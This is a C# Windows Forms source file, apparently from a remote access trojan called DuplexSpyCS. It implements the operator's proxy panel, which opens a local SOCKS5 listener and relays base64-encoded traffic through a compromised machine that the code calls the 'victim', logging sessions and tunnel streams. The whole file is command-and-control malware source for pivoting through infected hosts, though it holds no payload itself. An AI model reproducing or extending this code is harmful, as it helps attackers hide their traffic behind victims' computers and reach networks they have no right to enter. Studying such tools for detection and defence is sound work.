using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Globalization;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmProxy : Form
    {
        private clsLtnSocks5 m_ltnSocks5 { get; set; }
        private clsVictim m_victim { get; init; }

        public frmProxy(clsVictim victim)
        {
            InitializeComponent();

            m_victim = victim;
            Text = @$"Proxy\\{victim.ID}";
        }

        public void fnOnProxyOpened(clsLtnProxy ltnProxy, int nStreamId, clsVictim victim)
        {
            m_ltnSocks5.fnOnProxyOpened(nStreamId);

            Invoke(new Action(() =>
            {
                try
                {
                    if (m_ltnSocks5.Sessions.ContainsKey(nStreamId))
                    {
                        clsSocksSession session = m_ltnSocks5.Sessions[nStreamId];
                        ListViewItem item = new ListViewItem(nStreamId.ToString());
                        item.SubItems.Add(session.sktUser.RemoteEndPoint.ToString());

                        listView1.Items.Add(item);

                        toolStripStatusLabel1.Text = $"Session[{listView1.Items.Count}]";
                    }
                }
                catch (Exception ex)
                {
                    clsStore.sql_conn.WriteErrorLogs(victim, ex.Message);
                }
            }));
        }
        public void fnOnProxyData(clsLtnProxy ltnProxy, int nStreamId, clsVictim victim, byte[] abData)
        {
            m_ltnSocks5.fnOnClientData(nStreamId, abData);
        }
        public void fnOnProxyClosed(clsLtnProxy ltnProxy, int nStreamId, clsVictim victim)
        {
            m_ltnSocks5.fnOnProxyClose(nStreamId);

            Invoke(new Action(() =>
            {
                try
                {
                    ListViewItem item = listView1.FindItemWithText(nStreamId.ToString());
                    listView1.Items.Remove(item);

                    toolStripStatusLabel1.Text = $"Session[{listView1.Items.Count}]";

                    fnLogs($"Closed: Stream ID={nStreamId}");
                }
                catch (Exception ex)
                {
                    clsStore.sql_conn.WriteErrorLogs(victim, ex.Message);
                }
            }));
        }

        void fnRecv(clsListener listener, clsVictim victim, List<string> lsMsg)
        {
            if (!clsTools.fnbVictimEquals(victim, m_victim))
                return;

            try
            {
                if (lsMsg[0] == "proxy")
                {
                    if (lsMsg[1] == "socks5")
                    {
                        if (lsMsg[2] == "open")
                        {
                            int nCode = int.Parse(lsMsg[3]);
                            int nStreamId = int.Parse(lsMsg[4]);

                            if (nCode == 0)
                                return;

                            fnOnProxyOpened(m_ltnSocks5, nStreamId, victim);

                            fnLogs(nCode == 0 ? $"Stream ID={nStreamId} open failed." : $"Stream ID={nStreamId} open successfully.");
                        }
                        else if (lsMsg[2] == "data")
                        {
                            int nStreamId = int.Parse(lsMsg[3]);
                            string szB64 = lsMsg[4];
                            byte[] abBuffer = Convert.FromBase64String(szB64);

                            fnOnProxyData(m_ltnSocks5, nStreamId, victim, abBuffer);
                        }
                        else if (lsMsg[2] == "close")
                        {
                            int nStreamId = int.Parse(lsMsg[3]);

                            fnOnProxyClosed(m_ltnSocks5, nStreamId, victim);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                clsStore.sql_conn.WriteErrorLogs(victim, ex.Message);
            }
        }

        void fnLogs(string szMsg)
        {
            Invoke(new Action(() =>
            {
                richTextBox1.AppendText($"[{DateTime.Now.ToString("yyyy-MM-dd HH:mm", CultureInfo.InvariantCulture)}]: {szMsg}");
                richTextBox1.AppendText(Environment.NewLine);
            }));
        }

        void fnSetup()
        {
            foreach (string s in Enum.GetNames(typeof(clsSqlConn.enProxyProtocol)))
                toolStripComboBox1.Items.Add(s);

            toolStripComboBox1.SelectedIndex = 0;
            toolStripTextBox1.Text = "8000";

            toolStripStatusLabel1.Text = $"Session[{listView1.Items.Count}]";

            m_victim.m_listener.ReceivedDecoded += fnRecv;
        }

        private void frmProxy_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void toolStripTextBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (!Regex.IsMatch(toolStripTextBox1.Text, @"^\d+$"))
                e.Handled = true;

            int nValue = int.Parse(toolStripTextBox1.Text);
            if (nValue < 0)
                nValue = 0;
            else if (nValue > 65535)
                nValue = 65535;

            toolStripTextBox1.Text = nValue.ToString();
        }

        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            try
            {
                int nPort = int.Parse(toolStripTextBox1.Text);
                Dictionary<int, string> dicPort = clsStore.sql_conn.fnlsGetAllListener().ToDictionary(x => x.nPort, x => x.szName);
                if (dicPort.ContainsKey(nPort))
                {
                    MessageBox.Show(
                        $"This port[{nPort}] has been binding for: {dicPort[nPort]}\nPlease use a different port number.",
                        "This port has been binding.",
                        MessageBoxButtons.OK, MessageBoxIcon.Error
                    );

                    return;
                }

                if (m_ltnSocks5 != null && m_ltnSocks5.m_bIsRunning)
                {
                    MessageBox.Show("Sock5 listener is running.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }

                if (m_ltnSocks5 != null)
                {
                    m_ltnSocks5.Dispose();
                    m_ltnSocks5 = null;
                }

                m_ltnSocks5 = new clsLtnSocks5(m_victim, "foo", nPort, "foo");
                m_ltnSocks5.OnProxyOpened += fnOnProxyOpened;
                m_ltnSocks5.OnRecvVictimData += fnOnProxyData;
                m_ltnSocks5.OnProxyClosed += fnOnProxyClosed;

                m_ltnSocks5.fnStart();

                fnLogs("Listener has been started successfully.");
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                fnLogs(ex.Message);
            }
        }

        private void toolStripButton3_Click(object sender, EventArgs e)
        {
            if (m_ltnSocks5 == null || !m_ltnSocks5.m_bIsRunning)
                return;

            try
            {
                m_ltnSocks5.OnProxyOpened -= fnOnProxyOpened;
                m_ltnSocks5.OnRecvVictimData -= fnOnProxyData;
                m_ltnSocks5.OnProxyClosed -= fnOnProxyClosed;

                m_ltnSocks5.fnStop();

                fnLogs("Listener has been stopped successfully.");
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                fnLogs(ex.Message);
            }
        }

        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            new frmBoxHelper("Function\\Proxy").Show();
        }

        private void frmProxy_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (m_ltnSocks5 != null && m_ltnSocks5.m_bIsRunning)
            {
                DialogResult dr = MessageBox.Show(
                    "Proxy is running. You have to stop it before you exit.\n" +
                    "Do you want to stop it?",
                    "Warning",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Warning,
                    MessageBoxDefaultButton.Button1
                );

                if (dr == DialogResult.Yes)
                {
                    m_ltnSocks5.OnProxyOpened -= fnOnProxyOpened;
                    m_ltnSocks5.OnRecvVictimData -= fnOnProxyData;
                    m_ltnSocks5.OnProxyClosed -= fnOnProxyClosed;

                    m_ltnSocks5.fnStop();
                    m_ltnSocks5.Dispose();
                    m_ltnSocks5 = null;
                }
                else
                {
                    e.Cancel = true;
                }
            }
        }

        private void frmProxy_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_victim.m_listener.ReceivedDecoded -= fnRecv;
        }
    }
}
